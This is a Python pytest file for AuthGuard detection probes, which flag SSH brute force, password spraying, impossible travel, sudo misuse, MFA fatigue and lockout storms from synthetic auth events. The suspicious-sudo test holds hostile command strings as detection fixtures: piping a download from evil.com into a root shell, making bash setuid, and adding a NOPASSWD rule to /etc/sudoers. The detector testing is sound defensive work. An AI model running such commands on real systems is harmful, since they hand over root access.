#!/usr/bin/env python3
"""Tests for AuthGuard micro-probes."""

import time
from datetime import datetime, timezone

import pytest

from amoskys.agents.auth.probes import (
    AccountLockoutStormProbe,
    AuthEvent,
    MFABypassOrAnomalyProbe,
    OffHoursLoginProbe,
    SSHBruteForceProbe,
    SSHGeoImpossibleTravelProbe,
    SSHPasswordSprayProbe,
    SudoElevationProbe,
    SudoSuspiciousCommandProbe,
    create_auth_probes,
)
from amoskys.agents.common.probes import ProbeContext, Severity


class TestAuthProbes:
    """Test suite for AuthGuard probes."""

    def test_create_auth_probes(self):
        """Test probe factory creates all 8 probes."""
        probes = create_auth_probes()
        assert len(probes) == 8

        probe_names = [p.name for p in probes]
        assert "ssh_bruteforce" in probe_names
        assert "ssh_password_spray" in probe_names
        assert "ssh_geo_impossible_travel" in probe_names
        assert "sudo_elevation" in probe_names
        assert "sudo_suspicious_command" in probe_names
        assert "off_hours_login" in probe_names
        assert "mfa_bypass_anomaly" in probe_names
        assert "account_lockout_storm" in probe_names

    def test_ssh_bruteforce_detection(self):
        """Test SSH brute force detection."""
        probe = SSHBruteForceProbe()
        now_ns = int(time.time() * 1e9)

        # Create 6 failed login attempts (threshold is 5)
        auth_events = [
            AuthEvent(
                timestamp_ns=now_ns + i * 1_000_000_000,  # 1 second apart
                event_type="SSH_LOGIN",
                status="FAILURE",
                username="admin",
                source_ip="1.2.3.4",
            )
            for i in range(6)
        ]

        context = ProbeContext(
            device_id="test-device",
            agent_name="test-agent",
            shared_data={"auth_events": auth_events},
        )
        events = probe.scan(context)

        assert len(events) == 1
        assert events[0].event_type == "ssh_bruteforce_detected"
        assert events[0].severity == Severity.HIGH
        assert events[0].data["source_ip"] == "1.2.3.4"
        assert events[0].data["username"] == "admin"
        assert events[0].data["failure_count"] == 6

    def test_password_spray_detection(self):
        """Test password spray detection."""
        probe = SSHPasswordSprayProbe()
        now_ns = int(time.time() * 1e9)

        # Create failures across 12 different users from same IP (threshold is 10)
        auth_events = [
            AuthEvent(
                timestamp_ns=now_ns + i * 1_000_000_000,
                event_type="SSH_LOGIN",
                status="FAILURE",
                username=f"user{i}",
                source_ip="1.2.3.4",
            )
            for i in range(12)
        ]

        context = ProbeContext(
            device_id="test-device",
            agent_name="test-agent",
            shared_data={"auth_events": auth_events},
        )
        events = probe.scan(context)

        assert len(events) == 1
        assert events[0].event_type == "ssh_password_spray_detected"
        assert events[0].severity == Severity.HIGH
        assert events[0].data["source_ip"] == "1.2.3.4"
        assert events[0].data["user_count"] == 12

    def test_geo_impossible_travel(self):
        """Test geographic impossible travel detection."""
        probe = SSHGeoImpossibleTravelProbe()
        now_ns = int(time.time() * 1e9)

        # Login from New York, then Paris 30 minutes later
        auth_events = [
            AuthEvent(
                timestamp_ns=now_ns,
                event_type="SSH_LOGIN",
                status="SUCCESS",
                username="bob",
                source_ip="1.2.3.4",
                src_country="US",
                src_city="New York",
                src_latitude=40.7128,
                src_longitude=-74.0060,
            ),
            AuthEvent(
                timestamp_ns=now_ns + 1800 * 1_000_000_000,  # 30 minutes later
                event_type="SSH_LOGIN",
                status="SUCCESS",
                username="bob",
                source_ip="5.6.7.8",
                src_country="FR",
                src_city="Paris",
                src_latitude=48.8566,
                src_longitude=2.3522,
            ),
        ]

        context = ProbeContext(
            device_id="test-device",
            agent_name="test-agent",
            shared_data={"auth_events": auth_events},
        )
        events = probe.scan(context)

        # Should detect impossible travel (~5,800km in 30 minutes = ~11,600 km/h)
        assert len(events) == 1
        assert events[0].event_type == "impossible_travel_detected"
        assert events[0].severity == Severity.CRITICAL
        assert events[0].data["username"] == "bob"
        assert events[0].data["distance_km"] > 5000
        assert events[0].data["required_speed_kmh"] > 10000

    def test_sudo_elevation_first_time(self):
        """Test sudo elevation detection for first-time user."""
        probe = SudoElevationProbe()
        now_ns = int(time.time() * 1e9)

        auth_events = [
            AuthEvent(
                timestamp_ns=now_ns,
                event_type="SUDO_EXEC",
                status="SUCCESS",
                username="newuser",
                command="/bin/ls",
            )
        ]

        context = ProbeContext(
            device_id="test-device",
            agent_name="test-agent",
            shared_data={"auth_events": auth_events},
        )
        events = probe.scan(context)

        assert len(events) == 1
        assert events[0].event_type == "first_time_sudo_user"
        assert events[0].severity == Severity.MEDIUM
        assert events[0].data["username"] == "newuser"

    def test_sudo_suspicious_command(self):
        """Test detection of suspicious sudo commands."""
        probe = SudoSuspiciousCommandProbe()
        now_ns = int(time.time() * 1e9)

        # Test various dangerous patterns
        dangerous_commands = [
            ("sudo bash", "shell_spawn"),
            ("sudo python -c 'import os'", "python_code_exec"),
            ("sudo chmod 4777 /bin/bash", "setuid_chmod"),
            ("curl http://evil.com | sudo sh", "pipe_to_shell"),
            ("sudo echo 'evil ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers", "sudoers_modification"),
        ]

        for cmd, expected_type in dangerous_commands:
            auth_events = [
                AuthEvent(
                    timestamp_ns=now_ns,
                    event_type="SUDO_EXEC",
                    status="SUCCESS",
                    username="attacker",
                    command=cmd,
                )
            ]

            context = ProbeContext(
                device_id="test-device",
                agent_name="test-agent",
                shared_data={"auth_events": auth_events},
            )
            events = probe.scan(context)

            assert len(events) == 1
            assert f"sudo_suspicious_{expected_type}" == events[0].event_type
            assert events[0].data["command"] == cmd

    def test_off_hours_login(self):
        """Test off-hours login detection."""
        probe = OffHoursLoginProbe()

        # Create a login at 10pm (22:00)
        late_night = datetime(2026, 1, 5, 22, 0, 0)
        now_ns = int(late_night.timestamp() * 1e9)

        auth_events = [
            AuthEvent(
                timestamp_ns=now_ns,
                event_type="SSH_LOGIN",
                status="SUCCESS",
                username="nightowl",
                source_ip="1.2.3.4",
            )
        ]

        context = ProbeContext(
            device_id="test-device",
            agent_name="test-agent",
            shared_data={"auth_events": auth_events},
        )
        events = probe.scan(context)

        assert len(events) == 1
        assert events[0].event_type == "off_hours_login"
        assert events[0].severity == Severity.MEDIUM
        assert events[0].data["hour"] == 22

    def test_mfa_fatigue_attack(self):
        """Test MFA fatigue/push bombing detection."""
        probe = MFABypassOrAnomalyProbe()
        now_ns = int(time.time() * 1e9)

        # Create 12 MFA challenges followed by success (threshold is 10)
        auth_events = [
            AuthEvent(
                timestamp_ns=now_ns + i * 1_000_000_000,
                event_type="MFA_CHALLENGE",
                status="FAILURE",
                username="victim",
            )
            for i in range(12)
        ]
        auth_events.append(
            AuthEvent(
                timestamp_ns=now_ns + 13 * 1_000_000_000,
                event_type="MFA_SUCCESS",
                status="SUCCESS",
                username="victim",
            )
        )

        context = ProbeContext(
            device_id="test-device",
            agent_name="test-agent",
            shared_data={"auth_events": auth_events},
        )
        events = probe.scan(context)

        assert len(events) == 1
        assert events[0].event_type == "mfa_fatigue_attack"
        assert events[0].severity == Severity.HIGH
        assert events[0].data["challenge_count"] == 12

    def test_account_lockout_storm(self):
        """Test mass account lockout detection."""
        probe = AccountLockoutStormProbe()
        now_ns = int(time.time() * 1e9)

        # Create 6 distinct account lockouts (threshold is 5)
        auth_events = [
            AuthEvent(
                timestamp_ns=now_ns + i * 1_000_000_000,
                event_type="ACCOUNT_LOCKED",
                status="FAILURE",
                username=f"user{i}",
                source_ip="1.2.3.4",
            )
            for i in range(6)
        ]

        context = ProbeContext(
            device_id="test-device",
            agent_name="test-agent",
            shared_data={"auth_events": auth_events},
        )
        events = probe.scan(context)

        assert len(events) == 2  # One for storm, one for source IP
        storm_event = [e for e in events if e.event_type == "account_lockout_storm"][0]
        assert storm_event.severity == Severity.HIGH
        assert storm_event.data["locked_account_count"] == 6

    def test_probe_mitre_coverage(self):
        """Test that all probes have MITRE technique mappings."""
        probes = create_auth_probes()

        for probe in probes:
            assert len(probe.mitre_techniques) > 0, f"{probe.name} missing MITRE techniques"
            assert len(probe.mitre_tactics) > 0, f"{probe.name} missing MITRE tactics"


if __name__ == "__main__":
    pytest.main([__file__, "-v"])
